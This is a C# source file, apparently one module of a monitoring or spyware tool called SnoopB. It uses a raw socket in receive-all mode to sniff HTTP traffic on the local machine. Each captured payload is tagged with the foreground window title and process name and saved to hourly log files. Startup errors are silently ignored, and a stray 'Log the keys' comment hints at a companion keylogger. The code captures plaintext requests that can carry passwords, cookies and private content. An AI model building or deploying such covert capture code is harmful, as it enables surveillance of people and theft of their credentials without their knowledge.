using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using SnoopB.Configuration;
using SnoopB.Modules.CommonHelpers;

namespace SnoopB.Modules.HttpTrafficSniffer
{
    /// <summary>
    /// Save in a file, the HTTP logs. The interval is used to flush in the disk
    /// </summary>
    internal class HttpTrafficSnifferModule :Module
    {
        private string _textBuffer = string.Empty;
        private string _lastNameSaved;
        private readonly ManualResetEvent _cleanCacheWriteBuffer = new ManualResetEvent(true);
        private readonly ManualResetEvent _saveDiskWriteBuffer = new ManualResetEvent(true);
        private byte[] buffer;
        private Socket mainSocket;

        public HttpTrafficSnifferModule(int minutesInterval): base(minutesInterval)
        {
            try
            {
                InitSocket();
            }
            catch (Exception)
            {
               
            }
        }

        #region [ Module ]

        public new static string ModuleId
        {
            get { return "1cfd6d27-c340-4378-a983-065271e6ff90"; }
        }

        protected override void ExecuteInternal()
        {
            CheckAndSave();
        }

        #endregion

        private void CheckAndSave()
        {
            if (_lastNameSaved == null)
            {
                _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss") + ".httpMonitor";
                SaveLogfile(Path.Combine(Configurator.Instance.CurrentExecutionPath, _lastNameSaved));
            }
            else
            {
                SaveLogfile(Path.Combine(Configurator.Instance.CurrentExecutionPath, _lastNameSaved));

                var lastSaveHour = _lastNameSaved.Substring(12, 2);
                if (lastSaveHour != DateTime.Now.Hour.ToString())
                {
                    ClearMemoryCache();
                    _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss") + ".httpMonitor";
                }
            }
        }

        private void InitSocket()
        {
            mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            mainSocket.Bind(new IPEndPoint(IPAddress.Parse(LocalIPAddress()), 0));
            mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

            mainSocket.IOControl(IOControlCode.ReceiveAll, BitConverter.GetBytes(1), null);
            buffer = new byte[mainSocket.ReceiveBufferSize];

            mainSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, OnReceive, null);
        }

        private void OnReceive(IAsyncResult ar)
        {
            var nReceived = mainSocket.EndReceive(ar);

            if (nReceived <= 0)
                return;

            var ipHeader = new IPHeader(buffer, nReceived);

            if (ipHeader.ProtocolType == Protocol.TCP)
            {
                var tcpHeader = new TCPHeader(ipHeader.Data, ipHeader.MessageLength);

                var text = Encoding.ASCII.GetString(tcpHeader.Data, 0, tcpHeader.MessageLength);
                if (text.Contains("HTTP"))
                {
                    var p = System.Diagnostics.Process.GetProcessById(WinApi.GetWindowProcessID());
                    var thisapplication = WinApi.ActiveApplTitle().Trim().Replace("\0", "") + "######" + p.ProcessName;

                    //Entro a escribir en el buffer
                    _saveDiskWriteBuffer.Reset();
                    _cleanCacheWriteBuffer.WaitOne();
                    Logger(thisapplication, text);
                    _saveDiskWriteBuffer.Set();
                    //Termine de escribir en el buffer
                }
            }

            buffer = new byte[mainSocket.ReceiveBufferSize];
            mainSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, OnReceive, null);
        }

        private string LocalIPAddress()
        {
            var localIP = "";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        /// <summary>
        /// Log the keys
        /// </summary>
        private void Logger(string appRunning, string text)
        {
            _textBuffer += string.Format("[DateTime:{0} App: {1}]", DateTime.Now.ToString("dd-MM-yyyy-hh:mm:ss"), appRunning);
            _textBuffer += "\n";
            _textBuffer += text;
            _textBuffer += "\n";
        }

        private void SaveLogfile(string path)
        {
            _saveDiskWriteBuffer.WaitOne();
            if (string.IsNullOrEmpty(_textBuffer))
                return;

            using (var file = new TxtFile(path))
            {
                file.Create();

                _saveDiskWriteBuffer.WaitOne();
                file.Write(_textBuffer);
                file.Close();
            }
        }

        private void ClearMemoryCache()
        {
            //Entro a limpiar el buffer
            _cleanCacheWriteBuffer.Reset();
            _textBuffer = string.Empty;
            _cleanCacheWriteBuffer.Set();
            //Termine de limpiar el buffer
        }
    }
}